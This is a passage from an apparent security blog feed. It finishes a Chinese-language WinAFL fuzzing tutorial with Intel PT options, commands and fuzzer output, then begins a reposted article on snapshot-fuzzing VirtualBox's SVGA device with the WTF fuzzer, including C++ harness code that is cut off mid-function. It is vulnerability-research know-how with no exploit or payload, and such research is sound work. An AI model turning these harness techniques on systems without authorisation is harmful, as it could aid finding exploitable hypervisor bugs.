class="line">-target_method   - name of the method to fuzz in persistent mode. For this to</span><br><span class="line">                   work either the method needs to be exported or the symbols</span><br><span class="line">                   for target_module need to be available. Otherwise use</span><br><span class="line">                   -target_offset instead.</span><br><span class="line"></span><br><span class="line">-target_offset   - offset of the method to fuzz from the start of the module.</span><br><span class="line"></span><br><span class="line">-fuzz_iterations - Maximum number of iterations for the target function to run</span><br><span class="line">                   before restarting the target process.</span><br><span class="line"></span><br><span class="line">-nargs           - Number of arguments the fuzzed method takes. This is used</span><br><span class="line">                   to save/restore the arguments between runs.</span><br><span class="line"></span><br><span class="line">-call_convention - The default calling convention is cdecl on 32-bit x86</span><br><span class="line">                   platforms and Microsoft x64 for Visual Studio 64-bit</span><br><span class="line">                   applications. Possible values:</span><br><span class="line">                       * fastcall: fastcall</span><br><span class="line">                       * ms64: Microsoft x64 (Visual Studio)</span><br><span class="line">                       * stdcall: cdecl or stdcall</span><br><span class="line">                       * thiscall: thiscall</span><br><span class="line"></span><br><span class="line">-debug           - Debug mode. Does not try to connect to the server. Outputs</span><br><span class="line">                   a log file containing loaded modules, opened files and</span><br><span class="line">                   coverage information.</span><br><span class="line"></span><br><span class="line">-logdir          - specifies in which directory the log file will be written</span><br><span class="line">                   (only to be used with -debug).</span><br><span class="line"></span><br><span class="line">-thread_coverage - If set, WinAFL will only collect coverage from a thread</span><br><span class="line">                   that executed the target function</span><br></pre></td></tr></table></figure><ul><li><code>-nargs</code> target method æˆ–è€… target offset çš„å‚æ•°ä¸ªæ•°</li><li><code>-fuzz_iterations</code> é‡å¯è¿›ç¨‹å‰ï¼Œå¾ªç¯æ‰§è¡Œ target method æˆ–è€… target offset çš„æ¬¡æ•°</li><li><code>-target_moudle</code> fuzz çš„ç›®æ ‡æ¨¡å—ï¼Œéœ€è¦å’Œ target method æˆ–è€… target offset ä¸€èµ·ä½¿ç”¨</li><li><code>-target_method</code> persistent mode ä¸‹ fuzz çš„å‡½æ•°åï¼ˆæ–¹æ³•åï¼‰ï¼Œéœ€è¦æœ‰ç¬¦å· ï¼ˆsymbolsï¼‰</li><li><code>-target_offset</code> fuzz çš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ç›¸å¯¹äºæ¨¡å—èµ·å§‹åœ°å€çš„åç§»</li><li><code>-coverage_module</code> ç»Ÿè®¡è¦†ç›–ç‡çš„æ¨¡å—ï¼Œå¯ä»¥ç»Ÿè®¡å¤šä¸ªæ¨¡å—çš„ coverageï¼Œå³æŒ‡å®šå¤šä¸ª -coverage_module å‚æ•°</li><li><code>-covtype</code> bb æˆ–è€… edgeï¼Œbb ï¼ˆbasic block ä¸ºé»˜è®¤å€¼ï¼‰</li><li><code> -thread_coverage</code> ç”¨äºå¤šçº¿ç¨‹ç¨‹åºï¼Œåªç»Ÿè®¡ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ target function çš„è¦†ç›–ç‡å˜åŒ–</li></ul><h2 id="4-WinAFL-intel-PT-æ¨¡å¼ä½¿ç”¨"><a href="#4-WinAFL-intel-PT-æ¨¡å¼ä½¿ç”¨" class="headerlink" title="4. WinAFL intel PT æ¨¡å¼ä½¿ç”¨"></a>4. WinAFL intel PT æ¨¡å¼ä½¿ç”¨</h2><p>Intel PT (Processor Tracing) æ˜¯ Intel CPU çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä» Intel ç¬¬5ä»£å¤„ç†å™¨å¼€å§‹æ”¯æŒï¼Œ5th generation çš„å¾®æ¶æ„ä¸º <code>Broadwell</code>ã€‚ç›¸å…³è¯´æ˜å¯ä»¥å‚è€ƒï¼š<a href="https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html">https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html</a></p><p>Windows 10 ä» v1809 å¼€å§‹æä¾›äº† Intel PT çš„é©±åŠ¨ï¼Œä½†ç›®å‰æ²¡æœ‰å…¬å¼€çš„æ–‡æ¡£æè¿°æ­¤é©±åŠ¨ï¼Œä¹Ÿæ²¡æœ‰æä¾›å®˜æ–¹çš„ APIã€‚Â Alex Ionescu æä¾›äº† <a href="https://github.com/ionescu007/winipt">winipt</a> library å’Œ Intel PT é©±åŠ¨äº¤äº’ï¼ŒWinAFL åˆ©ç”¨ winipt æ¥è·å¾— Intel PT çš„ Processo Tracing ä¿¡æ¯ã€‚</p><p>WinAFL ä½¿ç”¨ Intel PT æ¨¡å¼ï¼Œå’Œ DynamoRIO ä¸åŒéœ€è¦æŒ‡å®š <code>-P</code> , WinAFL Intel PT æ¨¡å¼é™¤äº†å’ŒDynamoRIO ç›¸åŒçš„å‚æ•°å¤–é¢å¤–æ·»åŠ äº†ä¸‹é¢å‡ ä¸ªå‚æ•°ï¼š</p><ul><li><code>-trace_size</code> æ¯æ¬¡æ‰§è¡Œ traget æ‰‹æœºçš„ trace ä¿¡æ¯çš„å­—èŠ‚æ•°ï¼Œå¿…é¡»æ˜¯2 çš„æ¬¡æ–¹å¹¶ä¸”å¤§äº 4096</li><li><code>-decode</code> å¤„ç† trace ä¿¡æ¯çš„è§£ç å™¨ï¼Œæœ‰ä¸‰ä¸ªå¯é€‰å€¼ï¼š<code>tip</code>,  <code>tip_ref</code> å’Œ <code>full</code> (full ä¸ºé»˜è®¤å€¼)</li><li><code>-nopersistent_trace</code> ç”±äºæ€§èƒ½çš„ç¼˜æ•…ï¼ŒWinAFL æ¯æ¬¡å¾ªç¯æ‰§è¡Œ target æ˜¯ä¸é‡å¯ç¨‹åºï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥å¼ºåˆ¶ WinAFL æ¯æ¬¡æ‰§è¡Œ target éƒ½é‡å¯ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†è°ƒè¯•æ‰ä¼šå¯ç”¨è¿™ä¸ªé€‰é¡¹</li><li><code>-trace_cache_size</code>  trace ä¿¡æ¯çš„ cache å­—èŠ‚æ•°ï¼Œå’Œ <code>full</code> è§£ç å™¨ä¸€èµ·ä½¿ç”¨</li></ul><h2 id="5-æ£€æŸ¥-Intel-PT-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"><a href="#5-æ£€æŸ¥-Intel-PT-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ" class="headerlink" title="5 æ£€æŸ¥ Intel PT æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"></a>5 æ£€æŸ¥ Intel PT æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winaflpt-debug.exe -debug -coverage_module test_gdiplus.exe -fuzz_iterations 10 ^</span><br><span class="line">-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤å…¶å®å’Œæ£€æŸ¥ DynamoRIO æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œçš„å‘½ä»¤åŸºæœ¬ä¸€ç›´ï¼Œæ‰§è¡Œå‘½ä»¤åè¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Module loaded: test_gdiplus.exe</span><br><span class="line">Module loaded: ntdll.dll</span><br><span class="line">Module loaded: KERNEL32.DLjL</span><br><span class="line">Module loaded: KERNELBASE.dll</span><br><span class="line">Module loaded: ucrtbase.dll</span><br><span class="line">Module loaded: gdiplus.dll</span><br><span class="line">Module loaded: msvcrt.dll</span><br><span class="line">Module loaded: combase.dll</span><br><span class="line">Module loaded: VCRUNTIME140.dll</span><br><span class="line">Module loaded: RPCRT4.dll</span><br><span class="line">Module loaded: USER32.dll</span><br><span class="line">Module loaded: win32u.dll</span><br><span class="line">Module loaded: GDI32.dll</span><br><span class="line">Module loaded: gdi32full.dll</span><br><span class="line">Module loaded: msvcp_win.dll</span><br><span class="line">Module loaded: IMM32.DLL</span><br><span class="line">iteration 0</span><br><span class="line">Module loaded: uxtheme.dll</span><br><span class="line">Module loaded: msctf.dll</span><br><span class="line">Module loaded: oleaut32.dll</span><br><span class="line">Module loaded: sechost.dll</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 1</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 2</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 3</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 4</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 5</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 6</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 7</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 8</span><br><span class="line">Iteration finished normally</span><br><span class="line">iteration 9</span><br><span class="line">Iteration finished normally</span><br><span class="line">Coverage map (hex): </span><br><span class="line">00000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="6-ç”¨-Intel-PT-æ¨¡å¼-fuzz"><a href="#6-ç”¨-Intel-PT-æ¨¡å¼-fuzz" class="headerlink" title="6. ç”¨ Intel PT æ¨¡å¼ fuzz"></a>6. ç”¨ Intel PT æ¨¡å¼ fuzz</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe -i in -o out -P -t 20000 -- -coverage_module test_gdiplus.exe -fuzz_iterations 10 -target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@</span><br></pre></td></tr></table></figure><p>ç”¨ä¸Šé¢çš„å‘½ä»¤è°ƒç”¨ afl-fuzzï¼Œå‘ç°å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">               WinAFL 1.16b based on AFL 2.43b (test_gdiplus.exe)</span><br><span class="line"></span><br><span class="line">+- process timing -------------------------------------+- overall results ----+</span><br><span class="line">|        run time : 0 days, 0 hrs, 0 min, 13 sec       |  cycles done : 10    |</span><br><span class="line">|   last new path : none yet (odd, check syntax!)      |  total paths : 1     |</span><br><span class="line">| last uniq crash : none seen yet                      | uniq crashes : 0     |</span><br><span class="line">|  last uniq hang : none seen yet                      |   uniq hangs : 0     |</span><br><span class="line">+- cycle progress --------------------+- map coverage -+----------------------+</span><br><span class="line">|  now processing : 0 (0.00%)         |    map density : 0.04% / 0.04%        |</span><br><span class="line">| paths timed out : 0 (0.00%)         | count coverage : 1.07 bits/tuple      |</span><br><span class="line">+- stage progress --------------------+ findings in depth --------------------+</span><br><span class="line">|  now trying : havoc                 | favored paths : 1 (100.00%)           |</span><br><span class="line">| stage execs : 48/128 (37.50%)       |  new edges on : 1 (100.00%)           |</span><br><span class="line">| total execs : 2207                  | total crashes : 0 (0 unique)          |</span><br><span class="line">|  exec speed : 160.8/sec             |  total tmouts : 0 (0 unique)          |</span><br><span class="line">+- fuzzing strategy yields -----------+---------------+- path geometry -------+</span><br><span class="line">|   bit flips : 0/32, 0/31, 0/29                      |    levels : 1         |</span><br><span class="line">|  byte flips : 0/4, 0/3, 0/1                         |   pending : 0         |</span><br><span class="line">| arithmetics : 0/222, 0/2, 0/0                       |  pend fav : 0         |</span><br><span class="line">|  known ints : 0/19, 0/102, 0/40                     | own finds : 0         |</span><br><span class="line">|  dictionary : 0/0, 0/0, 0/0                         |  imported : n/a       |</span><br><span class="line">|       havoc : 0/1664, 0/0                           | stability : 100.00%   |</span><br><span class="line">|        trim : 42.86%/1, 0.00%                       +-----------------------+</span><br><span class="line">^C----------------------------------------------------+   [cpu000001:  18%]</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://github.com/googleprojectzero/winafl/blob/master/README.md">https://github.com/googleprojectzero/winafl/blob/master/README.md</a><br><a href="https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md">https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md</a><br><a href="https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md">https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0-ä¸‹è½½-Visual-Studio-Community-2022&quot;&gt;&lt;a href=&quot;#0-ä¸‹è½½-Visual-Studio-Community-2022&quot; class=&quot;headerlink&quot; title=&quot;0. ä¸‹è½½ Visual Studio Commun</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>When Hypervisor Met Snapshot Fuzzing</title>
    <link href="http://usmacd.com/2022/07/21/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/"/>
    <id>http://usmacd.com/2022/07/21/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/</id>
    <published>2022-07-21T08:00:00.000Z</published>
    <updated>2022-07-21T08:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>source: <a href="https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html">https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html</a></p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>Hypervisor was known as hard target to fuzz over several years. Even though, lots of prior pioneers( <a href="https://rezer0dai.github.io/biug-bounties/">Peter Hlavaty</a>, <a href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T2%20-%20Discovering%2010+%20Vulnerabilities%20in%20Virtualbox%20-%20Chen%20Nan.pdf">Chaitin Tech</a>, <a href="https://starlabs.sg/blog/2020/04-adventures-in-hypervisor-oracle-virtualbox-research/#coverage-guided-fuzzing">StarLabs</a>, <a href="https://github.com/SafeBreach-Labs/hAFL2">Peleg Hadar and Ophir Harpaz</a> and many others ) doing amazing work to overcome this limit and found interesting bugs.</p><p>But it is not an easy topic for some fresh newbie like me to starts from the bottom. I think manual code( or binary ) auditing and static analysis could be only considerable options if I start my research a few years ago without <strong>What The Fuzz</strong>.</p><p><a href="https://github.com/0vercl0k/wtf">What The Fuzz</a>( a.k.a WTF ) is a snapshot-based fuzzer targeting Windows Ring-3 and Ring-0 component. WTFâ€™s snapshot is based on memory dump both kernel and user-land. Because of that, WTF can not emulate any functionality which requires anything not within in-memory and can not create new process or thread because memory dump limited on single process. But WTF support <a href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/bochscpu_backend.cc#L265">breakpoint Handler</a> which you can set breakpoint on <strong>any</strong> address within memory dump and if fuzz execution reaches that address, pre-defined breakpoint handler will be executed. Based on this, we can trying to overcome some limitation on WTF such as <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fshooks.cc">file access</a>.</p><p>I really love WTFâ€™s flexibility and its potential, and I am going to show one of example usage of WTF on targeting Virtualbox to prove how awesome it is.</p><h1 id="2-Developing-Fuzz-Module"><a href="#2-Developing-Fuzz-Module" class="headerlink" title="2. Developing Fuzz Module"></a>2. Developing Fuzz Module</h1><p>First, you should define your own fuzz module for your target. There are few examples on github( <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">fuzzer_hevd.cc</a>, <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">fuzzer_tlv_server.cc</a> ) and blog post( <a href="https://blog.ret2.io/2021/07/21/wtf-snapshot-fuzzing/">ret2systems</a>, <a href="https://doar-e.github.io/blog/2021/07/15/building-a-new-snapshot-fuzzer-fuzzing-ida/">Doar-e</a> ). </p><p>My Target was Virtualboxâ€™s <strong>SVGA</strong> component.</p><p>SVGA is something like â€œ<a href="https://www.zerodayinitiative.com/blog/2021/1/6/mindshare-analysis-of-vmware-workstation-and-esxi-using-debug-symbols-from-flings">JavaScript of hypervisors</a>â€œ. Because of its complex nature, many hypervisor bugs are oriented by SVGA. And thatâ€™s the reason why I choose it as a first target.</p><p>VirtualBox have a function called <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4505">vmsvgaR3FifoLoop</a>. It <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4757">waits</a> until guest submit new command data through GPA. So this is a good spot( or should I call it <a href="https://youtu.be/ZaOtY4i5w_U">source</a>? ) to take a snapshot.</p><p>I set a breakpoint on <code>vmsvgaR3FifoLoop+4E2</code> to take snapshot. It is same position as <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4783">here</a>, start of switch-case routine for <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Devices/Graphics/vmsvga_include/svga_reg.h#L152">SVGA</a> and <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Additions/3D/mesa/mesa-17.3.9/src/gallium/drivers/svga/include/svga3d_cmd.h#L56">SVGA3D</a> command.</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah1.png" alt="blahblah1"></p><p>After creating snapshot, I had to decide make it <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">run multiple times in single execution</a> or <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">not</a>. Because SVGA is consist of various commands like define, update, delete somethingâ€¦, I thought fuzz campaign must handle multiple SVGA commands during single round.</p><p>First, I had to define structure to contains multiple testcases. Luckily, <a href="https://twitter.com/0vercl0k">0vercl0k</a> already write <a href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/fuzzer_tlv_server.cc#L24-L75">nice example</a> to doing that. So I did same thing as below.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SVGA_CMD_BODY_MAX 0xA000</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> SvgaCmdList[] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">1040</span>, <span class="number">1041</span>, <span class="number">1042</span>, <span class="number">1043</span>, <span class="number">1044</span>, <span class="number">1046</span>, <span class="number">1047</span>, <span class="number">1048</span>, <span class="number">1049</span>, <span class="number">1050</span>, <span class="number">1051</span>, <span class="number">1052</span>, <span class="number">1053</span>, <span class="number">1054</span>, <span class="number">1055</span>, <span class="number">1056</span>, <span class="number">1057</span>, <span class="number">1058</span>, <span class="number">1059</span>, <span class="number">1060</span>, <span class="number">1061</span>, <span class="number">1062</span>, <span class="number">1063</span>, <span class="number">1064</span>, <span class="number">1065</span>, <span class="number">1066</span>, <span class="number">1067</span>, <span class="number">1068</span>, <span class="number">1069</span>, <span class="number">1070</span>, <span class="number">1071</span>, <span class="number">1072</span>, <span class="number">1073</span>, <span class="number">1074</span>, <span class="number">1075</span>, <span class="number">1076</span>, <span class="number">1077</span>, <span class="number">1078</span>, <span class="number">1079</span>, <span class="number">1080</span>, <span class="number">1081</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> SvgaCmdListLen = <span class="number">58</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SvgaCmd_t</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> SvgaCmdCode;</span><br><span class="line">  std::vector&lt;<span class="type">uint8_t</span>&gt; SvgaBody;</span><br><span class="line">  <span class="built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmd_t, SvgaCmdCode, SvgaBody);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SvgaCmds_t</span> &#123;</span><br><span class="line">  std::vector&lt;SvgaCmd_t&gt; SvgaCmds;</span><br><span class="line">  <span class="built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmds_t, SvgaCmds);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  std::deque&lt;SvgaCmd_t&gt; SvgaCmds;</span><br><span class="line">  CpuState_t Context;</span><br><span class="line">  <span class="type">uint8_t</span> SvgaCmdBody[SVGA_CMD_BODY_MAX];</span><br><span class="line">  <span class="type">uint32_t</span> SvgaCmdBodySize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RestoreGprs</span><span class="params">(Backend_t *B)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;C = Context;</span><br><span class="line">    B-&gt;<span class="built_in">Rsp</span>(C.Rsp);</span><br><span class="line">    B-&gt;<span class="built_in">Rip</span>(C.Rip);</span><br><span class="line">    B-&gt;<span class="built_in">Rax</span>(C.Rax);</span><br><span class="line">    B-&gt;<span class="built_in">Rbx</span>(C.Rbx);</span><br><span class="line">    B-&gt;<span class="built_in">Rcx</span>(C.Rcx);</span><br><span class="line">    B-&gt;<span class="built_in">Rdx</span>(C.Rdx);</span><br><span class="line">    B-&gt;<span class="built_in">Rsi</span>(C.Rsi);</span><br><span class="line">    B-&gt;<span class="built_in">Rdi</span>(C.Rdi);</span><br><span class="line">    B-&gt;<span class="built_in">R8</span>(C.R8);</span><br><span class="line">    B-&gt;<span class="built_in">R9</span>(C.R9);</span><br><span class="line">    B-&gt;<span class="built_in">R10</span>(C.R10);</span><br><span class="line">    B-&gt;<span class="built_in">R11</span>(C.R11);</span><br><span class="line">    B-&gt;<span class="built_in">R12</span>(C.R12);</span><br><span class="line">    B-&gt;<span class="built_in">R13</span>(C.R13);</span><br><span class="line">    B-&gt;<span class="built_in">R14</span>(C.R14);</span><br><span class="line">    B-&gt;<span class="built_in">R15</span>(C.R15);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; GlobalState;</span><br><span class="line"></span><br><span class="line"><span class="function">SvgaCmds_t <span class="title">Deserialize</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Buffer, <span class="type">const</span> <span class="type">size_t</span> BufferSize)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> &amp;Root = json::json::<span class="built_in">parse</span>(Buffer, Buffer + BufferSize);</span><br><span class="line">  <span class="keyword">return</span> Root.<span class="built_in">get</span>&lt;SvgaCmds_t&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertTestcase</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Buffer, <span class="type">const</span> <span class="type">size_t</span> BufferSize)</span> </span>&#123;</span><br><span class="line">  GlobalState.SvgaCmds.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> &amp;Root = <span class="built_in">Deserialize</span>(Buffer, BufferSize);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> SvgaCmd : Root.SvgaCmds) &#123;</span><br><span class="line">    GlobalState.SvgaCmds.<span class="built_in">emplace_back</span>(std::<span class="built_in">move</span>(SvgaCmd));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It is almost identical as example.</p><p>Next question was, how can I insert data into snapshot? I had to find a insertion point and proper memory address. Luckily( again ), VirtualBox using a function called <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4183">vmsvgaR3FifoGetCmdPayload</a> to receive command data from guest to host. I define a breakpoint handler in <code>Init()</code> callback function as below.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// unsigned __int8 *__fastcall vmsvgaR3FifoGetCmdPayload(</span></span><br><span class="line"><span class="comment">//       unsigned int cbPayloadReq,</span></span><br><span class="line"><span class="comment">//       volatile unsigned int *pFIFO,</span></span><br><span class="line"><span class="comment">//       unsigned int offCurrentCmd,</span></span><br><span class="line"><span class="comment">//       unsigned int offFifoMin,</span></span><br><span class="line"><span class="comment">//       unsigned int offFifoMax,</span></span><br><span class="line"><span class="comment">//       unsigned __int8 *pbBounceBuf,</span></span><br><span class="line"><span class="comment">//       unsigned int *pcbAlreadyRead,</span></span><br><span class="line"><span class="comment">//       PDMTHREAD *pThread,</span></span><br><span class="line"><span class="comment">//       VGAState *pThis,</span></span><br><span class="line"><span class="comment">//       VMSVGAR3STATE *pSVGAState,</span></span><br><span class="line"><span class="comment">//       PDMDEVINSR3 *pDevIns)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoGetCmdPayload&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="type">uint32_t</span> cbPayloadReq = 